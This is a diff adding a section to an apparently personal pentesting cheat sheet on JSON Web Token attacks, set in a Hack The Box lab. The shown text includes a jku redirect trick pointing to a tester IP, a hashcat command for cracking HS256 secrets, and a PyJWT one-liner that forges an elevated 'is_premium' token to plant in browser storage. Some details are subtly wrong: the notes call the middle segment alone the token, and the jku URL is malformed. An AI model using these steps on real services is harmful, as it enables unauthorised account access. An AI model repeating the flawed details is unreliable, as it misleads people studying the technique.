@@ -68,6 +68,19 @@
                         <p>Since there was the sanitization that I told you. In that case we found a /redirect endpoint which allowed to perform a the query</p>
                         <pre><code class="language-json">"jku" "http://hackmedia.htb/static/../redirect?url=10.10.14.17.jwks" </code></pre>
                     </ul>
+                </ul>
+
+                <h3>Cracking JSON web tokens</h3>
+                <ul>
+                    <p>In some cases you may found that the JWT is signed using a weak algorithm like HS256. In that case you can try to crack the token using a wordlist</p>
+                    <p>First of all you must capture the token. Have in mind that the token is only the middle part. Example</p>
+                    <pre><code class="language-json">BASE64_BLOB.TOKEN.BASE64_BLOB</code></pre>
+                    <p>Then you can uSE hashcat to crack it</p>
+                    <pre><code class="language-bash">hashcat auth_token -m 16500 /usr/share/wordlists/rockyou.txt</code></pre>
+                    <p>Now that you have the key we can generate a new token. Take the contents of the original token and modify the parameters you would like. </p>
+                    <pre><code class="language-json">python -c "import jwt, datetime; print(jwt.encode({'id':7,'first_name':'Learner','last_name':'Learner','email':'learner@test.internal','is_premium':True,'exp':int(datetime.datetime.now().timestamp() + 24*60*60)}, 'THE-KEY-CRACKED-GOES-HERE', algorithm='HS256'))"</code></pre>
+                    <p>Now go to the browser and replace the token in the localStorage or cookies. In some cases you'll have also to modify another field in localStorage called auth_user. This will depend on the application you are pentesting</p>
+                </ul>
     
         </div>
     </div>
